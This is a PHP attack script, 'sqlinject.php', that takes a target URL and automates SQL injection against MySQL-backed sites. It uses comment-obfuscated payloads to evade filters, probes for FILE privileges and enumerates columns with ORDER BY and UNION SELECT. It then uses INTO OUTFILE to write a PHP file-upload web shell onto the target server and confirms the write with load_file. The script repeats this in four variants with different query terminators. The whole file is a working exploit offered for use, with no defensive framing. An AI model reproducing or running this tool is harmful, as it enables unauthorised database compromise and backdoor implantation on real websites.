<?php 
###################################
# Tool : sqlinject.php            #              
# Author : Trhacknon              #
# Fb : jelena corn                #
# email : jeremydiliotti@gmail.com#
###################################

print "\n\n

  _______ _____  _    _          _____ _  ___   _  ____  _   _ 
 |__   __|  __ \| |  | |   /\   / ____| |/ / \ | |/ __ \| \ | |
    | |  | |__) | |__| |  /  \ | |    | ' /|  \| | |  | |  \| |
    | |  |  _  /|  __  | / /\ \| |    |  < | . ` | |  | | . ` |
    | |  | | \ \| |  | |/ ____ \ |____| . \| |\  | |__| | |\  |
    |_|  |_|  \_\_|  |_/_/    \_\_____|_|\_\_| \_|\____/|_| \_|
                                                               
                                                               
\n\n";

echo "Choose injection type 

1 : the most popular
2 : popular
3 : less popular
4 : rare\n\n";

$balance=readline("Type :");

switch($balance){
  

    case 1:


print "\n\n

  _______ _____  _    _          _____ _  ___   _  ____  _   _ 
 |__   __|  __ \| |  | |   /\   / ____| |/ / \ | |/ __ \| \ | |
    | |  | |__) | |__| |  /  \ | |    | ' /|  \| | |  | |  \| |
    | |  |  _  /|  __  | / /\ \| |    |  < | . ` | |  | | . ` |
    | |  | | \ \| |  | |/ ____ \ |____| . \| |\  | |__| | |\  |
    |_|  |_|  \_\_|  |_/_/    \_\_____|_|\_\_| \_|\____/|_| \_|
                                                               
                                                               
\n\n\n";


$url=readline("Target url :");


if(isset($url) && $url!=""){


$normal=file_get_contents($url);
$clnormal=preg_replace('/<.*?>/','',$normal);


$payloads=array("'/**hussql**/aNd/**hussql**/(/*!50000SeLeCt*//**hussql**//*!00000substring(file_priv,1,1)*//**hussql**//*!00000from*//**hussql*//*!00000mysql*/./*!00000user*//**hussql**//*!00000where*//**hussql**//**hussql**//*!00000user*/=regexp_substr/**_**/(user(),'^[^@]*')+limit+0,1)='Y'--+-",
                "'/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/=/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'--+-",
                "'/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/=/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'--+-",
                "'/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/regexp/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'--+-",
                "'/**hussql**/and/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000is_grantable*/,1,1)/**hussql**//*!00000from*//*!00000information_schema*/./*!00000user_privileges*//**hussql**/where/**hussql**/regexp_replace(grantee,'\'','')=user/**hussql**/()/**hussql**/limit/**hussql**/0,1)='Y'--+-"
                /*
                You can add more options :)
                */);
                
                foreach($payloads AS $payload){


$check=file_get_contents($url.$payload);
$clcheck=preg_replace('/<.*?>/','',$check);

 if($clnormal==$clcheck){

echo "\n\n[*] Checking Current user priv...\n";

sleep(1);
echo "[+] current user is grantable :)\n\n";

@ob_flush();
@flush();
break;
}


}

echo "[*] Counting number of columns...\n";

for($i=1;$i<=100;$i++){
$check1=file_get_contents($url."'/**hussql**//*!00000oRder*//**hussql**//*!50000by*/".$i."/**hussql**/asc--+-");
$clcheck1=preg_replace('/<.*?>/','',$check1);
if($clnormal==$clcheck1){

echo "Try : column "."$i"." [+] \n"; 


sleep(1);

@ob_flush();
@flush();


}else{
echo "Try : column "."$i"." [-] \n";

sleep(1);

@ob_flush();
@flush();

break;
}



}

$x=($i-1);


$range=range(1,$x);
$nums=implode(',',$range);


echo "\n[*] Choosing the right column...\n\n";

$index = 0;
$count = 1;


   


foreach($range AS $rep){


$finalresp=file_get_contents($url."'/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/","'D3xt3rRim',",$nums)."--+-");
       
    $index++;

echo "Trying column number ".$index."\n";


sleep(1);

@ob_flush();
@flush();

if(preg_match('/D3xt3rRim/',$finalresp) && $i!==1){

echo "\nInfo : sometimes you need to double forward/back slashes"."\n";

$path = readline("enter the path :");

echo "\nInfo : if there is a file with the same name your file will not be uploaded"."\n";

$file= readline("Your file name :");

$s=$path.$file;

file_get_contents($url."'/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/",urlencode('"inf3ct3d<form method=post enctype=multipart/form-data><input type=file name=file><input type=submit></form><?php error_reporting(0); move_uploaded_file($_FILES[\'file\'][\'tmp_name\'],$_FILES[\'file\'][\'name\']); ?>",'),$nums)."/**hussql**//*!00000into*//**hussql**//*!00000outfile*//**hussql**/'{$s}'--+-");


$finalresp1=file_get_contents($url."'/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/","load_file/**hussql**/('{$s}'),",$nums)."--+-");
$finalresp2=preg_replace('/<.*?>/','',$finalresp1);

if(preg_match('/inf3ct3d/',$finalresp2)==1){


echo "\n[+] the file {$file} uploaded with success";
}else{
echo "\n[+] check the file {$file} in your target";
}
//}

break;

}

}
 
}


else{
echo "no target";
}
break;
/** End of case 1**/


    case 2:


print "\n\n

  _______ _____  _    _          _____ _  ___   _  ____  _   _ 
 |__   __|  __ \| |  | |   /\   / ____| |/ / \ | |/ __ \| \ | |
    | |  | |__) | |__| |  /  \ | |    | ' /|  \| | |  | |  \| |
    | |  |  _  /|  __  | / /\ \| |    |  < | . ` | |  | | . ` |
    | |  | | \ \| |  | |/ ____ \ |____| . \| |\  | |__| | |\  |
    |_|  |_|  \_\_|  |_/_/    \_\_____|_|\_\_| \_|\____/|_| \_|
                                                               
                                                               
\n\n\n";


$url=readline("Target url :");


if(isset($url) && $url!=""){


$normal=file_get_contents($url);
$clnormal=preg_replace('/<.*?>/','',$normal);


$payloads=array("/**hussql**/aNd/**hussql**/(/*!50000SeLeCt*//**hussql**//*!00000substring(file_priv,1,1)*//**hussql**//*!00000from*//**hussql*//*!00000mysql*/./*!00000user*//**hussql**//*!00000where*//**hussql**//**hussql**//*!00000user*/=regexp_substr/**_**/(user(),'^[^@]*')+limit+0,1)='Y'--",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/=/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'--",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/=/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'--",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/regexp/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'--",
                "/**hussql**/and/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000is_grantable*/,1,1)/**hussql**//*!00000from*//*!00000information_schema*/./*!00000user_privileges*//**hussql**/where/**hussql**/regexp_replace(grantee,'\'','')=user/**hussql**/()/**hussql**/limit/**hussql**/0,1)='Y'--"
                /*
                You can add more options :)
                */);
                
                foreach($payloads AS $payload){


$check=file_get_contents($url.$payload);
$clcheck=preg_replace('/<.*?>/','',$check);

 if($clnormal==$clcheck){

echo "\n\n[*] Checking Current user priv...\n";

sleep(1);
echo "[+] current user is grantable :)\n\n";

@ob_flush();
@flush();
break;
}


}





echo "[*] Counting number of columns...\n";

for($i=1;$i<=100;$i++){
$check1=file_get_contents($url."/**hussql**//*!00000oRder*//**hussql**//*!50000by*/".$i."/**hussql**/asc--");
$clcheck1=preg_replace('/<.*?>/','',$check1);
if($clnormal==$clcheck1){

echo "Try : column "."$i"." [+] \n"; 


sleep(1);

@ob_flush();
@flush();


}else{
echo "Try : column "."$i"." [-] \n";

sleep(1);

@ob_flush();
@flush();

break;
}



}

$x=($i-1);


$range=range(1,$x);
$nums=implode(',',$range);


echo "\n[*] Choosing the right column...\n\n";

$index = 0;
$count = 1;

foreach($range AS $rep){

$finalresp=file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/","'D3xt3rRim',",$nums)."--");
  
    $index++;

echo "Trying column number ".$index."\n";


sleep(1);

@ob_flush();
@flush();

if(preg_match('/D3xt3rRim/',$finalresp) && $i!==1){

echo "\nInfo : sometimes you need to double/or more+ forward/back slashes"."\n";

$path = readline("enter the path :");

echo "\nInfo : if there is a file with the same name your file will not be uploaded"."\n";

$file= readline("Your file name :");

$s=$path.$file;

file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/",urlencode('"inf3ct3d<form method=post enctype=multipart/form-data><input type=file name=file><input type=submit></form><?php error_reporting(0);  move_uploaded_file($_FILES[\'file\'][\'tmp_name\'],$_FILES[\'file\'][\'name\']); ?>",'),$nums)."/**hussql**//*!00000into*//**hussql**//*!00000outfile*//**hussql**/'{$s}'--");




$finalresp1=file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/","load_file/**hussql**/('{$s}'),",$nums)."--");
$finalresp2=preg_replace('/<.*?>/','',$finalresp1);

if(preg_match('/inf3ct3d/',$finalresp2)==1){


echo "\n[+] the file {$file} uploaded with success";
}else{
echo "\n[+] check the file {$file} in your target";
}
//}

break;

}

}

 
}


else{
echo "no target";
}
break;
/** End of case 2**/

    case 3:


print "\n\n

  _______ _____  _    _          _____ _  ___   _  ____  _   _ 
 |__   __|  __ \| |  | |   /\   / ____| |/ / \ | |/ __ \| \ | |
    | |  | |__) | |__| |  /  \ | |    | ' /|  \| | |  | |  \| |
    | |  |  _  /|  __  | / /\ \| |    |  < | . ` | |  | | . ` |
    | |  | | \ \| |  | |/ ____ \ |____| . \| |\  | |__| | |\  |
    |_|  |_|  \_\_|  |_/_/    \_\_____|_|\_\_| \_|\____/|_| \_|
                                                               
                                                               
\n\n\n";


$url=readline("Target url :");


if(isset($url) && $url!=""){


$normal=file_get_contents($url);
$clnormal=preg_replace('/<.*?>/','',$normal);


$payloads=array("/**hussql**/aNd/**hussql**/(/*!50000SeLeCt*//**hussql**//*!00000substring(file_priv,1,1)*//**hussql**//*!00000from*//**hussql*//*!00000mysql*/./*!00000user*//**hussql**//*!00000where*//**hussql**//**hussql**//*!00000user*/=regexp_substr/**_**/(user(),'^[^@]*')+limit+0,1)='Y';%00",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/=/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y';%00",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/=/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y';%00",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/regexp/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y';%00",
                "/**hussql**/and/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000is_grantable*/,1,1)/**hussql**//*!00000from*//*!00000information_schema*/./*!00000user_privileges*//**hussql**/where/**hussql**/regexp_replace(grantee,'\'','')=user/**hussql**/()/**hussql**/limit/**hussql**/0,1)='Y';%00"
                /*
                You can add more options :)
                */);
                
                foreach($payloads AS $payload){


$check=file_get_contents($url.$payload);
$clcheck=preg_replace('/<.*?>/','',$check);

 if($clnormal==$clcheck){

echo "\n\n[*] Checking Current user priv...\n";

sleep(1);
echo "[+] current user is grantable :)\n\n";

@ob_flush();
@flush();
break;
}


}





echo "[*] Counting number of columns...\n";

for($i=1;$i<=100;$i++){
$check1=file_get_contents($url."/**hussql**//*!00000oRder*//**hussql**//*!50000by*/".$i."/**hussql**/asc;%00");
$clcheck1=preg_replace('/<.*?>/','',$check1);
if($clnormal==$clcheck1){

echo "Try : column "."$i"." [+] \n"; 


sleep(1);

@ob_flush();
@flush();


}else{
echo "Try : column "."$i"." [-] \n";

sleep(1);

@ob_flush();
@flush();

break;
}



}

$x=($i-1);


$range=range(1,$x);
$nums=implode(',',$range);


echo "\n[*] Choosing the right column...\n\n";

$index = 0;
$count = 1;

foreach($range AS $rep){

$finalresp=file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/","'D3xt3rRim',",$nums).";%00");
  
    $index++;

echo "Trying column number ".$index."\n";


sleep(1);

@ob_flush();
@flush();

if(preg_match('/D3xt3rRim/',$finalresp) && $i!==1){

echo "\nInfo : sometimes you need to double forward/back slashes"."\n";

$path = readline("enter the path :");

echo "\nInfo : if there is a file with the same name your file will not be uploaded"."\n";

$file= readline("Your file name :");

$s=$path.$file;

file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/",urlencode('"inf3ct3d<form method=post enctype=multipart/form-data><input type=file name=file><input type=submit></form><?php error_reporting(0); move_uploaded_file($_FILES[\'file\'][\'tmp_name\'],$_FILES[\'file\'][\'name\']); ?>",'),$nums)."/**hussql**//*!00000into*//**hussql**//*!00000outfile*//**hussql**/'{$s}';%00");


$finalresp1=file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/","load_file/**hussql**/('{$s}'),",$nums).";%00");
$finalresp2=preg_replace('/<.*?>/','',$finalresp1);

if(preg_match('/inf3ct3d/',$finalresp2)==1){


echo "\n[+] the file {$file} uploaded with success";
}else{
echo "\n[+] check the file {$file} in your target";
}
//}

break;

}

}

 
}


else{
echo "no target";
}
break;
/** End of case 3**/


    case 4:


print "\n\n

  _______ _____  _    _          _____ _  ___   _  ____  _   _ 
 |__   __|  __ \| |  | |   /\   / ____| |/ / \ | |/ __ \| \ | |
    | |  | |__) | |__| |  /  \ | |    | ' /|  \| | |  | |  \| |
    | |  |  _  /|  __  | / /\ \| |    |  < | . ` | |  | | . ` |
    | |  | | \ \| |  | |/ ____ \ |____| . \| |\  | |__| | |\  |
    |_|  |_|  \_\_|  |_/_/    \_\_____|_|\_\_| \_|\____/|_| \_|
                                                               
                                                               
\n\n\n";


$url=readline("Target url :");


if(isset($url) && $url!=""){


$normal=file_get_contents($url);
$clnormal=preg_replace('/<.*?>/','',$normal);


$payloads=array("/**hussql**/aNd/**hussql**/(/*!50000SeLeCt*//**hussql**//*!00000substring(file_priv,1,1)*//**hussql**//*!00000from*//**hussql*//*!00000mysql*/./*!00000user*//**hussql**//*!00000where*//**hussql**//**hussql**//*!00000user*/=regexp_substr/**_**/(user(),'^[^@]*')+limit+0,1)='Y'",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/=/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/=/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'",
                "/**hussql**/aNd/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000file_priv*/,1,1)/**hussql**/from/**hussql**/mysql.user/**hussql**/where/**hussql**/user/**hussql**/regexp/**hussql**/substring(user/**hussql**/(),1,length(user))/**hussql**/limit/**hussql**/0,1)='Y'",
                "/**hussql**/and/**hussql**/(/*!00000seLeCt*//**hussql**/substring(/*!00000is_grantable*/,1,1)/**hussql**//*!00000from*//*!00000information_schema*/./*!00000user_privileges*//**hussql**/where/**hussql**/regexp_replace(grantee,'\'','')=user/**hussql**/()/**hussql**/limit/**hussql**/0,1)='Y'"
                /*
                You can add more options :)
                */);
                
                foreach($payloads AS $payload){


$check=file_get_contents($url.$payload);
$clcheck=preg_replace('/<.*?>/','',$check);

 if($clnormal==$clcheck){

echo "\n\n[*] Checking Current user priv...\n";

sleep(1);
echo "[+] current user is grantable :)\n\n";

@ob_flush();
@flush();
break;
}


}





echo "[*] Counting number of columns...\n";

for($i=1;$i<=100;$i++){
$check1=file_get_contents($url."/**hussql**//*!00000oRder*//**hussql**//*!50000by*/".$i."/**hussql**/asc");
$clcheck1=preg_replace('/<.*?>/','',$check1);
if($clnormal==$clcheck1){

echo "Try : column "."$i"." [+] \n"; 


sleep(1);

@ob_flush();
@flush();


}else{
echo "Try : column "."$i"." [-] \n";

sleep(1);

@ob_flush();
@flush();

break;
}



}

$x=($i-1);


$range=range(1,$x);
$nums=implode(',',$range);


echo "\n[*] Choosing the right column...\n\n";

$index = 0;
$count = 1;

foreach($range AS $rep){

$finalresp=file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/","'D3xt3rRim',",$nums));
  
    $index++;

echo "Trying column number ".$index."\n";


sleep(1);

@ob_flush();
@flush();

if(preg_match('/D3xt3rRim/',$finalresp) && $i!==1){

echo "\nInfo : sometimes you need to double forward/back slashes"."\n";

$path = readline("enter the path :");

echo "\nInfo : if there is a file with the same name your file will not be uploaded"."\n";

$file= readline("Your file name :");

$s=$path.$file;

file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/",urlencode('"inf3ct3d<form method=post enctype=multipart/form-data><input type=file name=file><input type=submit></form><?php error_reporting(0); move_uploaded_file($_FILES[\'file\'][\'tmp_name\'],$_FILES[\'file\'][\'name\']); ?>",'),$nums)."/**hussql**//*!00000into*//**hussql**//*!00000outfile*//**hussql**/'{$s}'");


$finalresp1=file_get_contents($url."/**hussql**/and/**hussql**/false/**hussql**//*!00000union*//**hussql**//**hussql**//*!00000select*//**hussql**/".preg_replace("/\b{$rep}+[^0-9]/","load_file/**hussql**/('{$s}'),",$nums));
$finalresp2=preg_replace('/<.*?>/','',$finalresp1);

if(preg_match('/inf3ct3d/',$finalresp2)==1){


echo "\n[+] the file {$file} uploaded with success";
}else{
echo "\n[+] check the file {$file} in your target";
}
//}

break;

}

}

 
}


else{
echo "no target";
}
break;
/** End of case 4**/




}


?>
